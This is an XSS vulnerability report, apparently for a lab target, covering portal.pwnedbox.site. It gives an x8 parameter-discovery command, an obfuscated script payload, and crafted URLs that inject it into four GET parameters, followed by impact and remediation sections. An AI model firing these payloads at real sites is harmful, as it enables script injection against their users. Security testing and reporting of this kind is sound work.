## Title
Reflected XSS - GET Parameter Reflection

## Description
The application at `https://portal.pwnedbox.site/` reflects user-controlled GET parameter values in its response without properly preventing JavaScript execution. During testing, x8 identified multiple reflected parameters. Further manual testing confirmed reflected XSS through the `page.id`, `number`, `id`, and `cat` parameters.

A crafted URL containing an HTML script payload triggers JavaScript execution in the browser, displaying an alert with the message `XSS`.

**Affected URL:** https://portal.pwnedbox.site/  
**HTTP Method:** GET  
**Affected Parameters:** `page.id`, `number`, `id`, `cat`

## Steps to Reproduce
1. Open `https://portal.pwnedbox.site/`.
2. Use x8 to identify reflected GET parameters.
3. Test the identified parameters with the crafted XSS payload.
4. Open the crafted URLs in a browser.
5. Observe the JavaScript alert displaying `XSS`.

## POC (Proof of Concept)
**Lab Address:** https://portal.pwnedbox.site/  
**HTTP Method:** GET  
**Vulnerable Parameters:** `page.id`, `number`, `id`, `cat`

**x8 Discovery Command:**
```bash
x8 -u https://portal.pwnedbox.site/ -X GET --disable-progress-bar --reflected-only -w params.txt
```

**Discovered Reflected Parameters:**
```text
cat
fname
id
lname
number
page
page.id
```

**Payload:**
```html
mihir'"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

**Crafted URLs:**

1. `page.id`
```text
https://portal.pwnedbox.site/?page.id=mihir%27"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

2. `number`
```text
https://portal.pwnedbox.site/?number=mihir%27"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

3. `id`
```text
https://portal.pwnedbox.site/?id=mihir%27"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

4. `cat`
```text
https://portal.pwnedbox.site/?cat=mihir%27"><ScRiPt>\u0061lert("XSS")</ScRiPt>
```

**Observed Result:**

The crafted URLs successfully executed JavaScript in the browser. A JavaScript alert displaying `XSS` appeared when testing the `page.id`, `number`, `id`, and `cat` parameters.

**Screenshot Evidence:**
1. x8 output showing the discovered reflected GET parameters.
   <img width="1908" height="531" alt="image" src="https://github.com/user-attachments/assets/77d01847-b7fb-42f6-8b9b-0c189b38f505" />


2. Browser alert triggered through the `page.id` parameter.
   <img width="1919" height="972" alt="image" src="https://github.com/user-attachments/assets/ea7442b7-f30e-4347-8a89-abf1fdef1d38" />


3. Browser alert triggered through the `page` parameter.
   <img width="1919" height="971" alt="image" src="https://github.com/user-attachments/assets/4d71072f-865e-4d1f-a227-9b215d11aca3" />


4. Browser alert triggered through the `id` parameter.
   <img width="1919" height="969" alt="image" src="https://github.com/user-attachments/assets/ff683010-6c91-4075-b979-ee84bd57c735" />


5. Browser alert triggered through the `cat` parameter.
   <img width="1919" height="978" alt="image" src="https://github.com/user-attachments/assets/c0183729-d8da-4fe1-b6db-9e5be3a13866" />


6. Browser alert triggered through the `number` parameter.
   <img width="1916" height="987" alt="image" src="https://github.com/user-attachments/assets/ff9946b4-974b-4885-8658-9e0e57ab80a0" />



## Impact
An attacker could craft a malicious URL and trick a victim into opening it. Successful exploitation may allow:

- Execution of attacker-controlled JavaScript in the victim's browser.
- Phishing through manipulated page content.
- Unauthorized actions within the victim's authenticated session, depending on application protections.
- Access to sensitive information available to the page's JavaScript context.

## Remediation
1. Apply context-aware output encoding to all user-controlled GET parameter values.
2. Avoid inserting untrusted input directly into HTML or executable JavaScript contexts.
3. Implement strict input validation and safe output handling.
4. Deploy a restrictive Content Security Policy (CSP) as an additional security layer.
